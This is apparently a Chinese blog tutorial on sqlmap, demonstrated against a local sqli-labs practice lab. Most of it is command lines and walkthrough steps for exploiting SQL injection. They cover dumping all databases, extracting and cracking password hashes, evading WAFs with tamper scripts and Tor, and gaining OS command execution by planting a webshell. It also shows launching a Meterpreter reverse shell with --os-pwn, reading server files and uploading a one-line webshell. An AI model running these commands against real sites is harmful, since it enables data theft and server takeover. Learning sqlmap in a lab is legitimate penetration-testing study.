 已在虚拟机搭建sqlilabs，

地址为http://192.168.137.128/pentest/sqlilabs/Less-1/

## Sqlmap的简单用法

```python
sqlmap -r http.txt  #http.txt是我们抓取的http的请求包
sqlmap -r http.txt -p username  #指定参数，当有多个参数而你又知道username参数存在SQL漏洞，你就可以使用-p指定参数进行探测
sqlmap -u "http://www.xx.com/username/admin*"       #如果我们已经知道admin这里是注入点的话，可以在其后面加个*来让sqlmap对其注入
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"   #探测该url是否存在漏洞
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"   --cookie="抓取的cookie"   #当该网站需要登录时，探测该url是否存在漏洞
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"  --data="uname=admin&passwd=admin&submit=Submit"  #抓取其post提交的数据填入
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --users      #查看数据库的所有用户
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --passwords  #查看数据库用户名的密码
有时候使用 --passwords 不能获取到密码，则可以试下
-D mysql -T user -C host,user,password --dump  当MySQL< 5.7时
-D mysql -T user -C host,user,authentication_string --dump  当MySQL>= 5.7时
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --current-user  #查看数据库当前的用户
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --is-dba    #判断当前用户是否有管理员权限
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --roles     #列出数据库所有管理员角色，仅适用于oracle数据库的时候

sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --dbs        #爆出所有的数据库
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --tables     #爆出所有的数据表
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --columns    #爆出数据库中所有的列
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --current-db #查看当前的数据库
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --tables #爆出数据库security中的所有的表
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --columns #爆出security数据库中users表中的所有的列
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users -C username --dump  #爆出数据库security中的users表中的username列中的所有数据
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users -C username --dump --start 1 --stop 100  #爆出数据库security中的users表中的username列中的前100条数据

sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --dump-all #爆出数据库security中的users表中的所有数据
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --dump-all   #爆出数据库security中的所有数据
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --dump-all  #爆出该数据库中的所有数据

sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"  --tamper=space2comment.py  #指定脚本进行过滤，用/**/代替空格
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --level=5 --risk=3 #探测等级5，平台危险等级3，都是最高级别。当level=2时，会测试cookie注入。当level=3时，会测试user-agent/referer注入。
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --sql-shell  #执行指定的sql语句
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --os-shell/--os-cmd   #执行--os-shell命令，获取目标服务器权限
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --os-pwn   #执行--os-pwn命令，将目标权限弹到MSF上

sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --file-read "c:/test.txt" #读取目标服务器C盘下的test.txt文件
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --file-write  test.txt  --file-dest "e:/hack.txt"  #将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt

sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --dbms="MySQL"     #指定其数据库为mysql 
其他数据库：Altibase,Apache Derby, CrateDB, Cubrid, Firebird, FrontBase, H2, HSQLDB, IBM DB2, Informix, InterSystems Cache, Mckoi, Microsoft Access, Microsoft SQL Server, MimerSQL, MonetDB, MySQL, Oracle, PostgreSQL, Presto, SAP MaxDB, SQLite, Sybase, Vertica, eXtremeDB
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --random-agent   #使用任意的User-Agent爆破
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --proxy="http://127.0.0.1:8080"    #指定代理
当爆破HTTPS网站会出现超时的话，可以使用参数 --delay=3 --force-ssl
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --technique T    #指定时间延迟注入，这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式，当然，我们也可以直接手工指定。
支持的探测方式如下：
　　B: Boolean-based blind SQL injection（布尔型注入）
　　E: Error-based SQL injection（报错型注入）
　　U: UNION query SQL injection（可联合查询注入）
　　S: Stacked queries SQL injection（可多语句查询注入）
　　T: Time-based blind SQL injection（基于时间延迟注入）

sqlmap -d "mysql://root:root@192.168.10.130:3306/mysql" --os-shell   #知道网站的账号密码直接连接

-v3                   #输出详细度  最大值5 会显示请求包和回复包
--threads 5           #指定线程数
--fresh-queries       #清除缓存
--flush-session       #清空会话，重构注入 
--batch               #对所有的交互式的都是默认的
--random-agent        #任意的http头
--tamper base64encode            #对提交的数据进行base64编码
--referer http://www.baidu.com   #伪造referer字段

--keep-alive     保持连接，当出现 [CRITICAL] connection dropped or unknown HTTP status code received. sqlmap is going to retry the request(s) 保错的时候，使用这个参数
```

### 探测指定URL是否存在SQL注入漏洞

**对于不用登录的网站**，直接指定其URL

```python
sqlmap -u  "http://192.168.137.128/pentest/sqlilabs/Less-1/?id=1"  #探测该url是否存在漏洞
```

在探测目标URL是否存在漏洞的过程中，Sqlmap会和我们进行交互。

比如第一处交互的地方是说这个目标系统的数据库好像是Mysql数据库，是否还探测其他类型的数据库。我们选择 n，就不探测其他类型的数据库了，因为我们已经知道目标系统是Mysql数据库了。

第二处交互的地方是说 对于剩下的测试，问我们是否想要使用扩展提供的级别(1)和风险(1)值的“MySQL”的所有测试吗？ 我们选择 y。

[![img](https://p2.ssl.qhimg.com/t01402f9ea9562a8e25.png)](https://p2.ssl.qhimg.com/t01402f9ea9562a8e25.png)

第三处交互是说已经探测到参数id存在漏洞了，是否还探测其他地方，我们选择 n 不探测其他参数了 。

最后sqlmap就列出了参数id存在的注入类型是boolean盲注，还有payload其他信息也显示出来了，最后还列出了目标系统的版本，php，apache等信息。

[![img](https://p1.ssl.qhimg.com/t018ffeaea388a20f96.png)](https://p1.ssl.qhimg.com/t018ffeaea388a20f96.png)

这次探测的所有数据都被保存在了 **/root/.sqlmap/output/192.168.10.1/** 目录下

[![img](https://p4.ssl.qhimg.com/t0109afcd10954974f6.png)](https://p4.ssl.qhimg.com/t0109afcd10954974f6.png)

**对于需要登录的网站**，我们需要指定其cookie 。我们可以用账号密码登录，然后用抓包工具抓取其cookie填入

```python
sqlmap -u  "http://192.168.10.1/sqli/Less-1/?id=1"   --cookie="抓取的cookie"  #探测该url是否存在漏洞
```

**对于是post提交数据的URL**，我们需要指定其data参数

```python
sqlmap -u "http://192.168.10.1/sqli/Less-11/?id=1" --data="uname=admin&passwd=admin&submit=Submit"  #抓取其post提交的数据填入
```

[![img](https://p2.ssl.qhimg.com/t01cd3dcbfe0685247b.png)](https://p2.ssl.qhimg.com/t01cd3dcbfe0685247b.png)

**我们也可以通过抓取 http 数据包保存为文件**，然后指定该文件即可。这样，我们就可以不用指定其他参数，这对于需要登录的网站或者post提交数据的网站很方便。

我们抓取了一个post提交数据的数据包保存为post.txt，如下，uname参数和passwd参数存在SQL注入漏洞

```perl
POST /sqli/Less-11/ HTTP/1.1
Host: 192.168.10.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Referer: http://192.168.10.1/sqli/Less-11/
Connection: close
Upgrade-Insecure-Requests: 1

uname=admin&passwd=admin&submit=Submit
```

然后我们可以指定这个数据包进行探测

```python
sqlmap -r post.txt        #探测post.txt文件中的http数据包是否存在sql注入漏洞
```

他也会和我们进行交互，询问我们，这里就不一一解释了

[![img](https://p4.ssl.qhimg.com/t0184de93de8fd4b128.png)](https://p4.ssl.qhimg.com/t0184de93de8fd4b128.png)

可以看到，已经探测到 uname 参数存在漏洞了，问我们是否还想探测其他参数，我们选择的 y ，它检测到passwd也存在漏洞了，问我们是否还想探测其他参数，我们选择 n

[![img](https://p4.ssl.qhimg.com/t010d67187cada10591.png)](https://p4.ssl.qhimg.com/t010d67187cada10591.png)

然后会让我们选择，在后续的测试中，是选择 uname 这个参数还是passwd这个参数作为漏洞，随便选择一个就好了。

[![img](https://p0.ssl.qhimg.com/t01562d119ea7abc2a0.png)](https://p0.ssl.qhimg.com/t01562d119ea7abc2a0.png)

### 查看数据库的所有用户(—users)

```python
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --users #查看数据库的所有用户
```

### [![img](https://p1.ssl.qhimg.com/t01094c128ee722bb40.png)](https://p1.ssl.qhimg.com/t01094c128ee722bb40.png)

### 查看数据库所有用户名的密码(—passwords)

```python
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --passwords #查看数据库用户名的密码
```

第一处询问我们是否保存密码的hash值为文件，我们不保存。第二处问我们是否使用sqlmap自带的字典进行爆破，我们选择y，可以看出把密码爆破出来了，root用户的密码也为root。如果这里爆破不出来，我们可以拿hash值去字典更强大的地方爆破

### [![img](https://p1.ssl.qhimg.com/t0163773c28f2937ed5.png)](https://p1.ssl.qhimg.com/t0163773c28f2937ed5.png)

### 查看数据库当前用户(—current-user)

```python
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --current-user  #查看数据库当前的用户
```

### 判断当前用户是否有管理权限(—is-dba)

查看当前账户是否为数据库管理员账户

```python
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --is-dba  #判断当前用户是否有管理员权限
```

### [![img](https://p1.ssl.qhimg.com/t0121e516c7c614fc1b.png)](https://p1.ssl.qhimg.com/t0121e516c7c614fc1b.png)

### 列出数据库管理员角色(—roles)

```python
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --roles   #列出数据库所有管理员角色
```

### [![img](https://p1.ssl.qhimg.com/t01a095aa631969a7fc.png)](https://p1.ssl.qhimg.com/t01a095aa631969a7fc.png)

### 查看所有的数据库(—dbs)

```python
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --dbs
```

### [![img](https://p5.ssl.qhimg.com/t0189a6637411cb3482.png)](https://p5.ssl.qhimg.com/t0189a6637411cb3482.png)

### 查看当前的数据库(—current-db)

```python
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --current-db #查看当前的数据库
```

[![img](https://p4.ssl.qhimg.com/t0184d52d7edf6a0218.png)](https://p4.ssl.qhimg.com/t0184d52d7edf6a0218.png)

### 爆出指定数据库中的所有的表

```python
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --tables #爆出数据库security中的所有的表
```

[![img](https://p1.ssl.qhimg.com/t0154e7dcf64c049fce.png)](https://p1.ssl.qhimg.com/t0154e7dcf64c049fce.png)

### 爆出指定数据库指定表中的所有的列

```python
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --columns
```

[![img](https://p4.ssl.qhimg.com/t01557f4395d91accdc.png)](https://p4.ssl.qhimg.com/t01557f4395d91accdc.png)

### 爆出指定数据库指定表指定列下的数据

```python
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users -C username --dump  #爆出数据库security中的users表中的username列中的所有数据
```

[![img](https://p2.ssl.qhimg.com/t016b9a96c7c30a57d7.png)](https://p2.ssl.qhimg.com/t016b9a96c7c30a57d7.png)

### 爆出该网站数据库中的所有数据

```python
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --dump-all #爆出数据库security中的users表中的所有数据
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --dump-all   #爆出数据库security中的所有数据
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --dump-all  #爆出该数据库中的所有数据
```

## Sqlmap的高级用法

Sqlmap在默认情况下除了适用CHAR()函数防止出现单引号，没有对注入的数据进行修改。我们可以使用—tamper参数对数据进行修改来绕过WAF等设备，其中的大部分脚本主要用正则模块替换攻击载荷字符编码的方式尝试绕过WAF的检测规则。Sqlmap目前官方提供53个绕过脚本。

### 探测指定URL是否存在WAF，并且绕过

```
--identify-waf   检测是否有WAF

#使用参数进行绕过
--random-agent    使用任意HTTP头进行绕过，尤其是在WAF配置不当的时候
--time-sec=3      使用长的延时来避免触发WAF的机制，这方式比较耗时
--hpp             使用HTTP 参数污染进行绕过，尤其是在ASP.NET/IIS 平台上
--proxy=100.100.100.100:8080 --proxy-cred=211:985      使用代理进行绕过
--ignore-proxy    禁止使用系统的代理，直接连接进行注入
--flush-session   清空会话，重构注入
--hex 或者 --no-cast     进行字符码转换
--mobile          对移动端的服务器进行注入
--tor             匿名注入
```

### 指定脚本进行绕过(—tamper)

有些时候网站会过滤掉各种字符，可以用tamper来解决（对付某些waf时也有成效）

```perl
sqlmap  --tamper=space2comment.py  #用/**/代替空格
sqlmap  --tamper="space2comment.py,space2plus.py"  指定多个脚本进行过滤
```

过滤脚本在目录：**/usr/share/sqlmap/tamper**

[![img](https://p1.ssl.qhimg.com/t01565062aff86a2767.png)](https://p1.ssl.qhimg.com/t01565062aff86a2767.png)

### 探测等级和危险等级(—level —risk)

Sqlmap一共有5个探测等级，默认是1。等级越高，说明探测时使用的payload也越多。其中5级的payload最多，会自动破解出cookie、XFF等头部注入。当然，等级越高，探测的时间也越慢。这个参数会影响测试的注入点，GET和POST的数据都会进行测试，HTTP cookie在level为2时就会测试，HTTP User-Agent/Referer头在level为3时就会测试。在不确定哪个参数为注入点时，为了保证准确性，建议设置level为5

sqlmap一共有3个危险等级，也就是说你认为这个网站存在几级的危险等级。和探测等级一个意思，在不确定的情况下，建议设置为3级，—risk=3

sqlmap使用的payload在目录：**/usr/share/sqlmap/xml/payloads**

[![img](https://p3.ssl.qhimg.com/t01086cd70c1873d39a.png)](https://p3.ssl.qhimg.com/t01086cd70c1873d39a.png)

```python
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --level=5 --risk=3 #探测等级5，平台危险等级3，都是最高级别
```

[![img](https://p2.ssl.qhimg.com/t01d5a8232de4f2f4a6.png)](https://p2.ssl.qhimg.com/t01d5a8232de4f2f4a6.png)

### 伪造 Http Referer头部

Sqlmap可以在请求中伪造HTTP中的referer，当探测等级为3或者3以上时，会尝试对referer注入，可以使用referer命令来欺骗，比如，我们伪造referer头为百度。可以这样

```python
referer  http://www.baidu.com
```

### 执行指定的SQL语句(—sql-shell)

```python
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --sql-shell  #执行指定的sql语句
```

然后会提示我们输入要查询的SQL语句，注意这里的SQL语句最后不要有分号

[![img](https://p1.ssl.qhimg.com/t017e2aa4b411649faa.png)](https://p1.ssl.qhimg.com/t017e2aa4b411649faa.png)

### [![img](https://p5.ssl.qhimg.com/t016d7b506524e76a16.png)](https://p5.ssl.qhimg.com/t016d7b506524e76a16.png)

### 执行操作系统命令(—os-shell)

在数据库为MySQL、PostgreSql或者SQL Server时，可以执行该选项。

当为MySQL数据库时，需满足下面三个条件：

- 当前用户为 root
- 知道网站根目录的绝对路径
- 该数据库的 secure_file_priv 参数值为空(很多数据库的该值为NULL，这也就导致了即使当前用户是root，即使知道了网站根目录的绝对路径，也不能执行成功 —os-shell )

```python
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --os-shell  #执行--os-shell命令
```

**选择网站的脚本语言**

- 【1】ASP(默认)
- 【2】ASPX
- 【3】JSP
- 【4】PHP

您是否希望sqlmap进一步尝试引发完整路径的披露？【Y/n】

**选择判断网站可写目录的方法**

如果我们不知道网站的根目录的绝对路径的话，我们那里选择 4 暴力破解，尝试破解出根目录的绝对路径。这里因为是我们本地的环境，已经知道网站根目录的绝对地址了，所以选择 2

- 【1】使用公共的默认目录(C:/xampp/htdocs/，C:/wamp/www，C:/Inetpub/wwwroot/)
- 【2】自定义网络根目录绝对路径
- 【3】指定自定义的路径文件
- 【4】暴力破解

[![img](https://p3.ssl.qhimg.com/t01871e1fc335db81df.png)](https://p3.ssl.qhimg.com/t01871e1fc335db81df.png)

可以看到，其实执行os-shell的过程中，sqlmap向网站根目录写入两个文件 tmpblwkd.php 和 tmpueqch.php。真正的木马文件是tmpblwkd.php 。如果是非正常退出sqlmap的话，这两个文件不会被删除。只有当我们输入 x 或 q 退出 sqlmap 时，该文件才会被自动删除。

[![img](https://p5.ssl.qhimg.com/t015a0aa18a923881ee.png)](https://p5.ssl.qhimg.com/t015a0aa18a923881ee.png)

[![img](https://p4.ssl.qhimg.com/t01356b89b90db96323.png)](https://p4.ssl.qhimg.com/t01356b89b90db96323.png)

[![img](https://p5.ssl.qhimg.com/t01c5976157489fa7a4.png)](https://p5.ssl.qhimg.com/t01c5976157489fa7a4.png)

[![img](https://p5.ssl.qhimg.com/t01de1bbab11027a0db.png)](https://p5.ssl.qhimg.com/t01de1bbab11027a0db.png)

### 反弹一个MSF的shell(—os-pwn)

在数据库为MySQL、PostgreSql或者SQL Server时，可以执行该选项。并且需要当前获取的权限足够高才可以。

```
sqlmap -u "http://192.168.10.20:88/index.php?id=1"  --os-pwn
```

[![img](https://p5.ssl.qhimg.com/t01b527df2522fbd96c.png)](https://p5.ssl.qhimg.com/t01b527df2522fbd96c.png)

**选择连接的tunnel，这里选择默认的 1 就可以了**
[1] TCP: Metasploit Framework (default)
[2] ICMP: icmpsh – ICMP tunneling
\> 1

**选择网站的脚本语言，这里根据情况选择**
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
\> 4

**选择网站的路径，这里也是根据情况而定，如果知道网站路径的话，可以选择2然后手动输入**
[1] common location(s) (‘C:/xampp/htdocs/, C:/wamp/www/, C:/Inetpub/wwwroot/‘) (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
\> 2
please provide a comma separate list of absolute directory paths: C:\phpstudy\WWW

[![img](https://p1.ssl.qhimg.com/t01ed3941c4c73cca18.png)](https://p1.ssl.qhimg.com/t01ed3941c4c73cca18.png)

**然后选择连接的类型，这里选择默认的1 即可**

which connection type do you want to use?
[1] Reverse TCP: Connect back from the database host to this machine (default)
[2] Reverse TCP: Try to connect back from the database host to this machine, on all ports between the specified and 65535
[3] Reverse HTTP: Connect back from the database host to this machine tunnelling traffic over HTTP
[4] Reverse HTTPS: Connect back from the database host to this machine tunnelling traffic over HTTPS
[5] Bind TCP: Listen on the database host for a connection
\> 1

**然后还会提示监听的地址和端口，这里直接回车即可**

[![img](https://p3.ssl.qhimg.com/t01d5600ba16319fb20.png)](https://p3.ssl.qhimg.com/t01d5600ba16319fb20.png)

[![img](https://p2.ssl.qhimg.com/t01715275b9acc1930c.png)](https://p2.ssl.qhimg.com/t01715275b9acc1930c.png)

**然后这里选择payload的类型，我们这里选择默认的1**

which payload do you want to use?nt to use? [11563] ‘ (detected)]
[1] Meterpreter (default)
[2] Shell
[3] VNC
\> 1

[![img](https://p3.ssl.qhimg.com/t01dc5a821ad98334e4.png)](https://p3.ssl.qhimg.com/t01dc5a821ad98334e4.png)

执行完成后，如果不出问题，我们就可以获得一个MSF类型的shell了。

[![img](https://p1.ssl.qhimg.com/t011858b704025dfe6a.png)](https://p1.ssl.qhimg.com/t011858b704025dfe6a.png)

### 读取服务器文件(—file-read)

当数据库为MySQL、PostgreSQL或SQL Server，并且当前用户有权限时，可以读取指定文件，可以是文本文件或者二进制文件。

```python
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --file-read "c:/test.txt" #读取目标服务器C盘下的test.txt文件
```

[![img](https://p5.ssl.qhimg.com/t01b427170c4f0ab056.png)](https://p5.ssl.qhimg.com/t01b427170c4f0ab056.png)

可以看到，文件读取成功了，并且保存成了 /root/.sqlmap/output/192.168.10.1/files/c__test.txt 文件

### [![img](https://p5.ssl.qhimg.com/t013ae8d3a38bbf4e30.png)](https://p5.ssl.qhimg.com/t013ae8d3a38bbf4e30.png)

### 上传文件到数据库服务器中(—file-write —file-dest)

当数据库为MySQL、Postgre SQL或者Sql Server(通过powershell写入)，并且当前用户有权限向任意目录写文件的时候，可以上传文件到数据库服务器。文件可以是文本，也可以是二进制文件。

所以利用上传文件，我们可以上传一句话木马或者上传shell上去。

前提是我们知道网络的绝对路径

```python
python2 sqlmap.py -u http://192.168.10.130/sqli-labs/Less-2/?id=1 --file-write C:\Users\mi\Desktop\1.php --file-dest "C:\phpStudy\PHPTutorial\WWW\2.php"  #将本地的C:\Users\mi\Desktop\1.php文件上传到目标服务器C:\phpStudy\PHPTutorial\WWW\2.php
```

[![img](https://p2.ssl.qhimg.com/t01d920ad318047b01b.png)](https://p2.ssl.qhimg.com/t01d920ad318047b01b.png)

这里会问我们是否想验证上传成功，我们选择 y 的话，他就会读取该文件的大小，并且和本地的文件大小做比较，只要大于等于本地文件大小即说明上传功能了

[![img](https://p4.ssl.qhimg.com/t01b2207ac0c22f171d.png)](https://p4.ssl.qhimg.com/t01b2207ac0c22f171d.png)

[![img](https://p1.ssl.qhimg.com/t01ec317729423cc757.png)](https://p1.ssl.qhimg.com/t01ec317729423cc757.png)

如果你想和我一起讨论的话，那就加入我的知识星球吧！